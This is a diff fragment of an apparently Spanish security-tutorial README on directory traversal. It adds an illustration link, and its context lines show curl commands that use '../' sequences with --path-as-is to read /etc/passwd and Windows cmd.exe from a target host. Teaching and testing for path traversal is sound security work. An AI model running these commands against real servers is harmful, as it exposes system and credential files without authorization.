@@ -12,7 +12,11 @@ Configuraciones (/etc/passwd en Linux).
 
 curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd
 
+<img style="float:left" alt="Path traversal simple" src="https://github.com/hackingyseguridad/directoriotraversal/blob/master/pathtraversal.png">
+
 curl --path-as-is -k -v http://ip:80/../../../../../../windows/system32/cmd.exe
+
+
 
 ## http://www.hackingyseguridad.com
 
